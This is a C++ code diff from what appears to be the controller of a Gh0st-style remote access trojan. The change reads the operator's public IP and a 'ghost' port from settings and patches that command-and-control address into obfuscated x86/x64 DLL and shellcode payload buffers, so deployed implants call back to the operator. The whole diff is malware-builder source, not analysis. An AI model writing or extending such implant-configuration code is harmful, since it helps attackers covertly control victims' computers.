@@ -644,7 +644,7 @@ bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuff
 	return false;
 }
 
-Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true) {
+Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="") {
 	BYTE* szBuffer = NULL;
 	int dwFileSize = 0;
 
@@ -686,6 +686,16 @@ Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true) {
 	memset(szBuffer + 2 + sizeof(int) + dwFileSize, 0, padding);
 	// CMD_DLLDATA + SHELLCODE + dwFileSize + pData
 	auto md5 = CalcMD5FromBytes(szBuffer + 2 + sizeof(int), dwFileSize);
+	if (!addr.empty()) {
+		std::string s(skCrypt(FLAG_FINDEN)), ip, port;
+		int offset = MemoryFind((char*)szBuffer, s.c_str(), dwFileSize, s.length());
+		if (offset !=-1){
+			splitIpPort(addr, ip, port);
+			CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(szBuffer + offset);
+			server->SetServer(ip.c_str(), atoi(port.c_str()));
+			server->SetType(isDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE);
+		}
+	}
 	auto ret = new Buffer(szBuffer, bufSize + padding, padding, md5);
 	delete[] szBuffer;
 	if (srcData != pData) 
@@ -723,10 +733,15 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
 		}
 	}
-	m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false);
-	m_ServerDLL[PAYLOAD_DLL_X64] = ReadKernelDll(true);
-	m_ServerBin[PAYLOAD_DLL_X86] = ReadKernelDll(false, false);
-	m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false);
+	// 主控程序公网IP
+	std::string master = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "master", "");
+	if (!master.empty()) {
+		master += ":" + ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "ghost", "6543");
+	}
+	m_ServerDLL[PAYLOAD_DLL_X86] = ReadKernelDll(false, true, master);
+	m_ServerDLL[PAYLOAD_DLL_X64] = ReadKernelDll(true, true, master);
+	m_ServerBin[PAYLOAD_DLL_X86] = ReadKernelDll(false, false, master);
+	m_ServerBin[PAYLOAD_DLL_X64] = ReadKernelDll(true, false, master);
 
 	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
 	//  执行此操作
